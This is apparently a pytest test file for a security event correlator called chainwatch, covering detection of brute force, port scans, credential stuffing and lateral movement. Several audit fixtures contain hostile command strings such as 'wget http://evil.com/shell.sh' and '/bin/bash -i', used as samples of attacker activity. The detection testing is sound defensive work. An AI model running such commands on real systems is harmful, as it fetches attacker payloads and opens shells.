from datetime import datetime, timedelta
from pathlib import Path
import sys
sys.path.insert(0, str(Path(__file__).parent.parent))

from chainwatch import correlate_events

BASE = datetime(2026, 4, 21, 10, 0, 0)


def ts(s):
    return BASE + timedelta(seconds=s)


def fail(ip, s, user="root"):
    return {"event_type": "failed_login", "source_ip": ip, "user": user, "timestamp": ts(s)}


def ok(ip, user, s):
    return {"event_type": "successful_login", "source_ip": ip, "user": user, "timestamp": ts(s)}


def block(ip, port, s):
    return {"event_type": "fw_block", "src_ip": ip, "dst_port": port,
            "protocol": "TCP", "firewall": "ufw", "timestamp": ts(s)}


def exe(user, cmd, s):
    return {"event_type": "execve", "user": user, "command": cmd,
            "result": "success", "pid": "1", "timestamp": ts(s)}


def sudo(user, target, cmd, s):
    return {"event_type": "sudo_usage", "user": user, "target_user": target,
            "command": cmd, "timestamp": ts(s)}


# ── brute_force ───────────────────────────────────────────────────────────────

def test_brute_force_exactly_threshold():
    auth = [fail("1.2.3.4", i * 10) for i in range(5)]
    incidents = correlate_events(auth, [], [], window_seconds=600)
    assert len(incidents) == 1
    assert incidents[0]["chain_type"] == "brute_force"
    assert incidents[0]["severity"] == "medium"
    assert incidents[0]["source_ip"] == "1.2.3.4"


def test_brute_force_below_threshold_no_incident():
    auth = [fail("1.2.3.4", i * 10) for i in range(4)]
    incidents = correlate_events(auth, [], [], window_seconds=600)
    assert incidents == []


def test_brute_force_spread_beyond_window_no_incident():
    # 5 failures, each > window apart
    auth = [fail("1.2.3.4", i * 601) for i in range(5)]
    incidents = correlate_events(auth, [], [], window_seconds=600)
    assert incidents == []


def test_brute_force_multiple_ips_independent():
    auth = (
        [fail("10.0.0.1", i * 10) for i in range(5)] +
        [fail("10.0.0.2", i * 10) for i in range(5)]
    )
    incidents = correlate_events(auth, [], [], window_seconds=600)
    ips = {inc["source_ip"] for inc in incidents}
    assert ips == {"10.0.0.1", "10.0.0.2"}


def test_brute_force_two_non_overlapping_clusters():
    # First cluster at t=0..40, second at t=1200..1240 — both within separate windows
    auth = (
        [fail("1.2.3.4", i * 10) for i in range(5)] +
        [fail("1.2.3.4", 1200 + i * 10) for i in range(5)]
    )
    incidents = correlate_events(auth, [], [], window_seconds=600)
    assert len(incidents) == 2
    assert all(inc["chain_type"] == "brute_force" for inc in incidents)


# ── brute_then_login ────────────────────────────────────────────────────────

def test_brute_then_login():
    auth = [fail("1.2.3.4", i * 10) for i in range(5)] + [ok("1.2.3.4", "alice", 200)]
    incidents = correlate_events(auth, [], [], window_seconds=600)
    assert len(incidents) == 1
    assert incidents[0]["chain_type"] == "brute_then_login"
    assert incidents[0]["severity"] == "critical"
    assert len(incidents[0]["events"]) == 6


def test_brute_then_login_too_late():
    # Success arrives more than window after cluster end — plain brute_force
    auth = [fail("1.2.3.4", i * 10) for i in range(5)] + [ok("1.2.3.4", "alice", 1201)]
    incidents = correlate_events(auth, [], [], window_seconds=600)
    assert len(incidents) == 1
    assert incidents[0]["chain_type"] == "brute_force"


def test_brute_then_login_different_ip_not_linked():
    auth = (
        [fail("1.2.3.4", i * 10) for i in range(5)] +
        [ok("5.6.7.8", "alice", 100)]   # success from a different IP
    )
    incidents = correlate_events(auth, [], [], window_seconds=600)
    assert len(incidents) == 1
    assert incidents[0]["chain_type"] == "brute_force"


# ── portscan_then_login ────────────────────────────────────────────────────────────

def test_portscan_then_login_detected():
    ufw = [block("1.2.3.4", p, s) for p, s in ((22, 0), (80, 30), (443, 60))]
    auth = [fail("1.2.3.4", 300)]
    incidents = correlate_events(auth, ufw, [], window_seconds=600)
    assert len(incidents) == 1
    assert incidents[0]["chain_type"] == "portscan_then_login"
    assert incidents[0]["severity"] == "high"
    assert len(incidents[0]["events"]) == 4


def test_scan_no_follow_up_auth_no_incident():
    ufw = [block("1.2.3.4", 22, 0), block("1.2.3.4", 80, 30)]
    incidents = correlate_events([], ufw, [], window_seconds=600)
    assert incidents == []


def test_scan_auth_outside_window_no_incident():
    ufw = [block("1.2.3.4", 22, 0)]
    auth = [fail("1.2.3.4", 700)]   # 700s > window of 600s
    incidents = correlate_events(auth, ufw, [], window_seconds=600)
    assert incidents == []


def test_single_port_block_not_flagged_as_scan():
    # One blocked port before a login attempt is noise, not a port scan
    ufw = [block("1.2.3.4", 22, 0)]
    auth = [fail("1.2.3.4", 300)]
    incidents = correlate_events(auth, ufw, [], window_seconds=600)
    assert incidents == []


def test_two_distinct_ports_triggers_scan():
    ufw = [block("1.2.3.4", 22, 0), block("1.2.3.4", 80, 30)]
    auth = [fail("1.2.3.4", 300)]
    incidents = correlate_events(auth, ufw, [], window_seconds=600)
    assert len(incidents) == 1
    assert incidents[0]["chain_type"] == "portscan_then_login"


def test_portscan_then_login_only_blocks_within_window_included():
    ufw = [
        block("1.2.3.4", 22, 0),
        block("1.2.3.4", 80, 30),
        block("1.2.3.4", 443, 10000),  # this block is too far from the auth attempt
    ]
    auth = [fail("1.2.3.4", 400)]
    incidents = correlate_events(auth, ufw, [], window_seconds=600)
    assert len(incidents) == 1
    # Only the 2 blocks within 600s of the auth attempt should be included
    block_events = [e for e in incidents[0]["events"] if e["event_type"] == "fw_block"]
    assert len(block_events) == 2


# ── lateral_movement ──────────────────────────────────────────────────────────

def test_lateral_movement_network_tool_critical():
    auth = [ok("10.0.0.1", "alice", 0)]
    aud = [exe("alice", "/usr/bin/wget http://evil.com/shell.sh", 60)]
    incidents = correlate_events(auth, [], aud, window_seconds=600)
    assert len(incidents) == 1
    assert incidents[0]["chain_type"] == "lateral_movement"
    assert incidents[0]["severity"] == "critical"
    assert incidents[0]["source_ip"] == "10.0.0.1"


def test_lateral_movement_shell_tool_high():
    auth = [ok("10.0.0.1", "alice", 0)]
    aud = [exe("alice", "/bin/bash -i", 60)]
    incidents = correlate_events(auth, [], aud, window_seconds=600)
    assert len(incidents) == 1
    assert incidents[0]["severity"] == "high"


def test_lateral_movement_execve_before_login_not_linked():
    auth = [ok("10.0.0.1", "alice", 100)]
    aud = [exe("alice", "/usr/bin/wget http://evil.com/x", 50)]   # before login
    incidents = correlate_events(auth, [], aud, window_seconds=600)
    assert incidents == []


def test_lateral_movement_execve_after_window_not_linked():
    auth = [ok("10.0.0.1", "alice", 0)]
    aud = [exe("alice", "/usr/bin/wget http://evil.com/x", 601)]  # just outside window
    incidents = correlate_events(auth, [], aud, window_seconds=600)
    assert incidents == []


def test_lateral_movement_non_suspicious_cmd_not_flagged():
    auth = [ok("10.0.0.1", "alice", 0)]
    aud = [exe("alice", "/usr/bin/ls -la", 60)]
    incidents = correlate_events(auth, [], aud, window_seconds=600)
    assert incidents == []


def test_lateral_movement_different_user_not_linked():
    auth = [ok("10.0.0.1", "alice", 0)]
    aud = [exe("bob", "/usr/bin/wget http://evil.com/x", 60)]  # different user
    incidents = correlate_events(auth, [], aud, window_seconds=600)
    assert incidents == []


def test_lateral_movement_sudo_to_root_critical():
    auth = [ok("10.0.0.1", "alice", 0), sudo("alice", "root", "/bin/bash", 30)]
    incidents = correlate_events(auth, [], [], window_seconds=600)
    assert len(incidents) == 1
    assert incidents[0]["chain_type"] == "lateral_movement"
    assert incidents[0]["severity"] == "critical"


def test_lateral_movement_sudo_to_non_root_high():
    auth = [ok("10.0.0.1", "alice", 0), sudo("alice", "deploy", "/usr/bin/id", 30)]
    incidents = correlate_events(auth, [], [], window_seconds=600)
    assert len(incidents) == 1
    assert incidents[0]["severity"] == "high"


def test_lateral_movement_sudo_after_window_not_linked():
    auth = [ok("10.0.0.1", "alice", 0), sudo("alice", "root", "/bin/bash", 601)]
    incidents = correlate_events(auth, [], [], window_seconds=600)
    assert incidents == []


# ── credential_stuffing ───────────────────────────────────────────────────────

def test_credential_stuffing_five_unique_users():
    users = ["alice", "bob", "carol", "dave", "eve"]
    auth = [fail("5.5.5.5", i * 10, user=u) for i, u in enumerate(users)]
    incidents = correlate_events(auth, [], [], window_seconds=600)
    stuffing = [inc for inc in incidents if inc["chain_type"] == "credential_stuffing"]
    assert len(stuffing) == 1
    assert stuffing[0]["source_ip"] == "5.5.5.5"
    assert stuffing[0]["severity"] == "high"


def test_credential_stuffing_four_unique_users_no_incident():
    users = ["alice", "bob", "carol", "dave"]
    auth = [fail("5.5.5.5", i * 10, user=u) for i, u in enumerate(users)]
    incidents = correlate_events(auth, [], [], window_seconds=600)
    stuffing = [inc for inc in incidents if inc["chain_type"] == "credential_stuffing"]
    assert stuffing == []


def test_credential_stuffing_repeated_users_not_stuffing():
    # 10 attempts but only 2 unique users — brute_force, not stuffing
    auth = [fail("5.5.5.5", i * 10, user="root" if i % 2 == 0 else "admin")
            for i in range(10)]
    incidents = correlate_events(auth, [], [], window_seconds=600)
    stuffing = [inc for inc in incidents if inc["chain_type"] == "credential_stuffing"]
    assert stuffing == []


def test_credential_stuffing_outside_window_no_incident():
    users = ["alice", "bob", "carol", "dave", "eve"]
    # Each attempt > 600s apart
    auth = [fail("5.5.5.5", i * 700, user=u) for i, u in enumerate(users)]
    incidents = correlate_events(auth, [], [], window_seconds=600)
    stuffing = [inc for inc in incidents if inc["chain_type"] == "credential_stuffing"]
    assert stuffing == []


def test_credential_stuffing_coexists_with_brute_force():
    # 5 unique users = stuffing; also ≥5 total attempts = brute_force
    users = ["alice", "bob", "carol", "dave", "eve"]
    auth = [fail("5.5.5.5", i * 10, user=u) for i, u in enumerate(users)]
    incidents = correlate_events(auth, [], [], window_seconds=600)
    types = {inc["chain_type"] for inc in incidents}
    assert "credential_stuffing" in types
    assert "brute_force" in types


def test_credential_stuffing_all_events_included():
    users = ["alice", "bob", "carol", "dave", "eve"]
    auth = [fail("5.5.5.5", i * 10, user=u) for i, u in enumerate(users)]
    incidents = correlate_events(auth, [], [], window_seconds=600)
    stuffing = [inc for inc in incidents if inc["chain_type"] == "credential_stuffing"][0]
    assert len(stuffing["events"]) == 5


def test_lateral_movement_sudo_different_user_not_linked():
    auth = [ok("10.0.0.1", "alice", 0), sudo("bob", "root", "/bin/bash", 30)]
    incidents = correlate_events(auth, [], [], window_seconds=600)
    assert incidents == []


def test_lateral_movement_sudo_and_execve_combined():
    auth = [ok("10.0.0.1", "alice", 0), sudo("alice", "root", "/bin/bash", 30)]
    aud = [exe("alice", "/usr/bin/wget http://evil.com/x", 60)]
    incidents = correlate_events(auth, [], aud, window_seconds=600)
    assert len(incidents) == 1
    assert incidents[0]["severity"] == "critical"
    assert len(incidents[0]["events"]) == 3  # login + sudo + execve


# ── custom window ─────────────────────────────────────────────────────────────

def test_custom_window_respected():
    # 5 failures over 200s — detected with window=300, not with window=100
    auth = [fail("1.2.3.4", i * 40) for i in range(5)]   # span = 160s
    assert correlate_events(auth, [], [], window_seconds=300) != []
    assert correlate_events(auth, [], [], window_seconds=100) == []


# ── output ordering ───────────────────────────────────────────────────────────

def test_incidents_sorted_by_start_time():
    auth = (
        [fail("10.0.0.2", 1000 + i * 10) for i in range(5)] +  # starts later
        [fail("10.0.0.1", 0 + i * 10)    for i in range(5)]    # starts earlier
    )
    incidents = correlate_events(auth, [], [], window_seconds=600)
    starts = [inc["start_time"] for inc in incidents]
    assert starts == sorted(starts)
